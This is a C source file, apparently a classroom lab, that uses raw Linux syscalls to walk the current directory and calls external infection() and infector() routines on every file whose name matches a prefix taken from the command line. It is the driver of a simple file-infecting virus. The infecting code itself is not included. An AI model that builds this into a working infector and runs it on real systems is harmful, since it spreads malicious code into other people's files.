#include "Util.c"

#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_GETDENTS 141
#define SYS_CLOSE 6
#define SYS_LSEEK 19
#define O_RDWR 2
#define O_APPEND 1024
#define STDOUT 1
#define O_RDONLY 0
#define BUF_SIZE 8192

struct linux_dirent {
    long d_ino;
    long d_off;
    unsigned short d_reclen;
    char d_name[];
};

extern int system_call();
extern void infection();
extern void infector(char *filename);

int main (int argc , char* argv[], char* envp[])
{
    if (argc < 2 || strncmp(argv[1], "-a", 2) != 0) {
        system_call(SYS_WRITE, STDOUT, "Usage: program -a<prefix>\n", 28);
        return 1;
    }
    
    char *prefix = argv[1] + 2;

    int fd;
    int nread;
    char buf[BUF_SIZE];
    struct linux_dirent *d;
    int bpos;

    fd = system_call(SYS_OPEN, ".", O_RDONLY, 0);
    if (fd < 0) {
        system_call(SYS_WRITE, STDOUT, "Error opening directory\n", 24);
        return 1;
    }

    while ((nread = system_call(SYS_GETDENTS, fd, buf, BUF_SIZE)) > 0) {
        for (bpos = 0; bpos < nread;) {
            d = (struct linux_dirent *) (buf + bpos);

            if (strncmp(d->d_name, prefix, strlen(prefix)) == 0) {
                infection();
                infector(d->d_name);
            }

            system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
            system_call(SYS_WRITE, STDOUT, "\n", 1);

            bpos += d->d_reclen;
        }
    }

    if (nread < 0) {
        system_call(SYS_WRITE, STDOUT, "Error reading directory\n", 24);
    }

    system_call(SYS_CLOSE, fd);

    return 0;
}
